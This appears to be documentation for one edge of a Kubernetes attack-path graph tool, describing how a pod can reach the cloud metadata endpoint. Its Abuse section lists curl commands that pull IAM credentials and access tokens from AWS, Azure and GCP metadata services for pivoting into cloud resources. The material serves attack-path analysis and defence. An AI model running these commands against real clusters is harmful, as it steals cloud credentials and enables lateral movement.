# CH_accessIMDS

## Edge Schema

- **Source:** [CH_Pod](../NodeDescriptions/CH_Pod.md)
- **Target:** [CH_IMDSService](../NodeDescriptions/CH_IMDSService.md)

## General Information

The Pod can potentially reach the cloud provider metadata endpoint. Does not currently check NetworkPolicies or IMDSv2 hop-limit enforcement; treat as a potential path pending manual verification.

## Abuse

From the pod, query the cloud provider metadata endpoint to retrieve IAM credentials, instance identity, and configuration data. Credentials obtained here can be used to pivot to cloud-level resources outside the cluster.

```bash
# AWS - list available IAM roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS - retrieve credentials for a role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Azure - retrieve an access token for Azure Resource Manager
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP - retrieve a service account token
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

## References

- [AWS Instance Metadata Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [GCP Compute Metadata Server](https://cloud.google.com/compute/docs/metadata/overview)
- [HackTricks - Cloud Metadata Abuse](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html)
- [OWASP K08 - Cluster To Cloud Lateral Movement](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K08-Cluster-To-Cloud-Lateral-Movement.html)
- [Threat Matrix - Instance Metadata API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Instance%20Metadata%20API/)